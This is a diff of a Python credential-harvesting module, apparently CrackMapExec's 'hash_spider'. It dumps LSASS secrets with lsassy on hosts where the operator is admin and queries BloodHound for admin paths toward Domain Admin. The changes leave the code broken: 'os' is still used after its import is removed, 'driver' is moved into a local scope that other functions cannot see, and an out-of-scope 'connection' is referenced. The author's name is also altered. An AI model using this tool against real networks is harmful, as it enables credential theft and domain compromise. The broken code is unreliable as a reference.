@@ -1,33 +1,16 @@
 # Author:
-# Peter Gorman @hackerm00n on Twitter
+# Peter Gormington @hackerm00n on Twitter
 
-import configparser
-from ctypes import create_unicode_buffer
-from operator import contains
-from types import MethodType
-from urllib3 import Retry
+import sqlite3
+from sys import exit
 from neo4j import GraphDatabase, basic_auth
 from neo4j.exceptions import AuthError, ServiceUnavailable
-import sqlite3
-import sys
-import os
-from cme.modules.lsassy_dump import CMEModule as lsassy
-from cme.logger import CMEAdapter
 from lsassy import logger
 from lsassy.dumper import Dumper
 from lsassy.parser import Parser
 from lsassy.session import Session
 from lsassy.impacketfile import ImpacketFile
 
-config = configparser.ConfigParser()
-cme_path = os.path.expanduser('~/.cme')
-config.read(os.path.join(cme_path, 'cme.conf'))
-neo4j_user = config.get('BloodHound', 'bh_user')
-neo4j_pass = config.get('BloodHound', 'bh_pass')
-neo4j_uri = config.get('BloodHound', 'bh_uri')
-neo4j_port = config.get('BloodHound', 'bh_port')
-neo4j_db = "bolt://" + neo4j_uri + ":" + neo4j_port 
-driver = GraphDatabase.driver(neo4j_db, auth = basic_auth(neo4j_user, neo4j_pass), encrypted=False)
 db_path = os.path.expanduser("~/.cme/workspaces/default/hash_spider.sqlite3")
 dbconnection = sqlite3.connect(db_path, check_same_thread=False, isolation_level=None)
 cursor = dbconnection.cursor()
@@ -38,11 +21,11 @@ reported_da = []
 
 
 def neo4j_conn(context):
-    if config.get('BloodHound', 'bh_enabled') != "False":
+    if connection.config('BloodHound', 'bh_enabled') != "False":
         context.log.info("Connecting to Neo4j/Bloodhound.")
         try:
             session = driver.session()
-            list(session.run("MATCH (g:Group) return g"))
+            list(session.run("MATCH (g:Group) return g LIMIT 1"))
             context.log.info("Connection Successful!")
         except AuthError as e:
             context.log.error("Invalid credentials.")
@@ -52,17 +35,17 @@ def neo4j_conn(context):
             context.log.error("Error querying domain admins")
     else:
         context.log.highlight("BloodHound not marked enabled. Check cme.conf")
-        sys.exit()
+        exit()
 
 def neo4j_local_admins(context):
     global admin_results
     try:
         session = driver.session()
-        admins = session.run("MATCH (c:Computer) OPTIONAL MATCH (u1:User)-[:AdminTo]->(c) OPTIONAL MATCH (u2:User)-[:MemberOf*1..]->(:Group)-[:AdminTo]->(c) WITH COLLECT(u1) + COLLECT(u2) AS TempVar,c UNWIND TempVar AS Admins RETURN c.name AS COMPUTER, COUNT(DISTINCT(Admins)) AS ADMIN_COUNT,COLLECT(DISTINCT(Admins.name)) AS USERS ORDER BY ADMIN_COUNT DESC")
+        admins = session.run("MATCH (c:Computer) OPTIONAL MATCH (u1:User)-[:AdminTo]->(c) OPTIONAL MATCH (u2:User)-[:MemberOf*1..]->(:Group)-[:AdminTo]->(c) WITH COLLECT(u1) + COLLECT(u2) AS TempVar,c UNWIND TempVar AS Admins RETURN c.name AS COMPUTER, COUNT(DISTINCT(Admins)) AS ADMIN_COUNT,COLLECT(DISTINCT(Admins.name)) AS USERS ORDER BY ADMIN_COUNT DESC") # This query pulls all PCs and their local admins from Bloodhound. Based on: https://github.com/xenoscr/Useful-BloodHound-Queries/blob/master/List-Queries.md and other similar posts
         context.log.info("Admins and PCs obtained.")
     except Exception:
         context.log.error("Could not pull admins.")
-        sys.exit()
+        exit()
     admin_results = [record for record in admins.data()]
 
 def create_db(local_admins):
@@ -114,7 +97,7 @@ def process_creds(context, connection, credentials_data):
                                 if {item['name']} not in reported_da:
                                     context.log.success(f"You have a valid path to DA as {item['name']}.")
                                     reported_da.append({item['name']})
-                                sys.exit()
+                                exit()
 
 def initial_run(connection):
     username = connection.username
@@ -217,10 +200,15 @@ class CMEModule:
                         self.spider_pcs(context, connection)
         if len(admin_access) > 0:
             context.log.error("No more local admin access known. Please try re-running Bloodhound with newly found accounts.")
-            sys.exit()
+            exit()
         
     def on_admin_login(self, context, connection):
-        neo4j_conn(context)
+        neo4j_user = connection.config('BloodHound', 'bh_user')
+        neo4j_pass = connection.config('BloodHound', 'bh_pass')
+        neo4j_uri = connection.config('BloodHound', 'bh_uri')
+        neo4j_port = connection.config('BloodHound', 'bh_port')
+        neo4j_db = "bolt://" + neo4j_uri + ":" + neo4j_port 
+        driver = GraphDatabase.driver(neo4j_db, auth = basic_auth(neo4j_user, neo4j_pass), encrypted=False)
         neo4j_local_admins(context)
         create_db(admin_results)
         initial_run(connection)
